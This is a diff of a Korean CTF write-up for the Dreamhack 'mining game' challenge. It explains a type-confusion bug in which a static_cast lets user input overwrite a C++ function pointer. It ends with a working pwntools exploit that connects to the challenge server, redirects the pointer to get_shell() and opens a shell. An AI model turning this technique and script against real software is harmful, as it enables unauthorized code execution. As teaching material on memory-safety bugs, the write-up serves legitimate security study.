@@ -65,44 +65,130 @@ Dreamhack mining game
     * 사용자의 입력에 따라 `mining`, `show_mineral_book`, `edit_mineral_book` 함수를 호출하거나 프로그램을 종료한다.
  
 
-  ## 취약점 분석: edit_mineral_book() 함수에서 발생하는 Type Confusion
+
+## 취약점 분석: edit_mineral_book() 함수에서 발생하는 Type Confusion
+
+### 1. 프로그램에 나오는 두 클래스
 
 ```cpp
-strncpy(
-    static_cast<UndiscoveredMineral*>(minerals[index])->description,
-    description.c_str(),
-    MAX_DESCRIPTION_SIZE
-);
+class UndiscoveredMineral : public Mineral {
+    char description[16];  // 그냥 문자열
+}
+
+class RareEarth : public Mineral {
+    DESC_FUNC description; // 함수 포인터 (예: print_cerium_description 등)
+}
 ```
 
-* Mineral 클래스는 추상 클래스 (virtual void print_description())
-* UndiscoveredMineral은 char description[MAX_DESCRIPTION_SIZE]를 가지고 있으며 이 description을 출력함.
-* RareEarth는 DESC_FUNC 함수 포인터 하나만 가지고 있고, 이걸 실행함.
-* mining() 함수에서 둘 중 하나가 랜덤으로 생성되어 minerals 벡터에 저장됨.
-* edit_mineral_book()에서 UndiscoveredMineral을 고른다고 가정하고 description을 수정할 수 있음.
-* 사용자는 UndiscoveredMineral로 가정하고 강제로 캐스팅해서 description에 문자열을 씀.
-* 하지만 minerals[index]가 실제로는 RareEarth 객체일 수도 있음.
-* RareEarth 객체는 DESC_FUNC description이라는 함수 포인터 하나만 가짐.
-* 즉, RareEarth 객체를 UndiscoveredMineral*로 잘못 캐스팅하여 함수 포인터를 문자열로 오인하고 strncpy()로 덮어버림.
+둘 다 Mineral* 포인터로 vector<Mineral*> minerals에 저장돼서 공통 인터페이스로 관리됨.
 
-→ **그 결과 함수 포인터(RareEarth::description)를 우리가 원하는 주소로 임의로 조작 가능**
+---------------------
+
+
+### 2. edit_mineral_book() 함수의 문제점
+
+```cpp
+void edit_mineral_book() {
+    ...
+    strncpy(
+        static_cast<UndiscoveredMineral*>(minerals[index])->description,
+        description.c_str(),
+        MAX_DESCRIPTION_SIZE
+    );
+}
+```
+
+여기서 문제는
+* 실제로 minerals[index]가 RareEarth*인데
+* 무작정 UndiscoveredMineral*로 강제로 바꿔서 함수 포인터가 저장된 영역에 문자열을 덮어버림.
+
+**구조체를 잘못 해석해서 함수 포인터에 내가 입력한 문자열이 들어가버리는 것이 핵심 취약점**
+→ **그 결과 함수 포인터(RareEarth::description)를 원하는 주소로 임의로 조작 가능**
+
+
+
+이를 이용하면
+
+
+```cpp
+void RareEarth::print_description() const {
+    if (description)
+        description();  // ← 공격자가 덮은 포인터를 호출
+}
+```
+
+* print_description()이 호출될 때 description()이 실행됨
+* 그런데 그 description은 함수 포인터였고 지금은 덮어쓴 주소임
+
+→ 쉘 따기 가능 (get_shell() 주소로 덮어서)
+
 
 
 
 ## 익스플로잇 시나리오
 
-1. 희귀광물(RareEarth)을 먼저 획득
-* mining()을 반복하여 RareEarth를 찾음 ("You found a rare-earth element!" 메시지가 뜸)
-* 이때 minerals[i]에는 RareEarth*가 들어감
+**1. mining()을 반복해서 rare-earth 광물을 하나 발견함**
+* 이건 내부적으로 RareEarth* 객체로 저장됨
 
-2. edit_mineral_book()으로 해당 i번 인덱스를 수정
-* static_cast<UndiscoveredMineral*>로 잘못 캐스팅됨
-* 입력한 값이 RareEarth의 함수 포인터(DESC_FUNC) 자리에 덮어짐
+**2. 발견한 rare-earth의 인덱스를 기억함 (idx 변수)**
 
-3. 그 후 show_mineral_book()으로 해당 인덱스를 출력
-* RareEarth::print_description()이 실행되고 내부적으로 description()을 호출하므로 덮어쓴 주소가 실행됨
+**3. 메뉴 3번 (edit_mineral_book)을 실행해서**
+* 해당 인덱스를 지정
+* description 입력을 get_shell() 주소로 덮어씀
 
-4. get_shell()의 주소를 덮어씌우면 쉘 획득 가능
+**4. 이후 RareEarth::print_description()이 호출되면**
+* 함수 포인터가 get_shell로 되어 있으므로 쉘이 뜸
+
+
+
+## 익스플로잇 코드
+
+```python
+from pwn import *
+import time
+
+p = remote('host1.dreamhack.games', 13735)
+
+getsh_addr = 0x402576
+payload = p64(getsh_addr)
+idx = 0
+
+while True:
+    print(idx)
+    p.recvuntil(b'>> ')       
+    p.sendline(b"1")        
+    p.recvline()
+    time.sleep(1.1)
+    a = p.recvline()
+    print('output :', a.decode())  
+
+    if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n" or a == b"[+] You found a rare-earth element!\n":
+        if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n":
+            print('mineral')
+            p.recvuntil(b"Please enter mineral's description : ")
+            p.sendline(b"aaaa")
+            idx += 1
+        else:
+            print('rare-earth')
+            for _ in range(5):
+                print(p.recvline().decode())
+            p.recvuntil(b'>> ')
+            p.sendline(b'3')
+            p.recv(12)
+            p.sendline(str(idx).encode())   
+            p.recv(37)
+            p.send(payload)
+            p.interactive()
+```
+
+
+
+
+
+<img width="437" height="178" alt="image" src="https://github.com/user-attachments/assets/d12fac32-d724-4d1a-ac18-68f0b88ca22b" />
+
+프로그램 돌려놓고 rareearth 채굴때까지 대기 > 메뉴 뜨면 description 출력 위해서 2 누르면 쉘이 따지고 플래그 획득 가능하다.
+
 
 
   
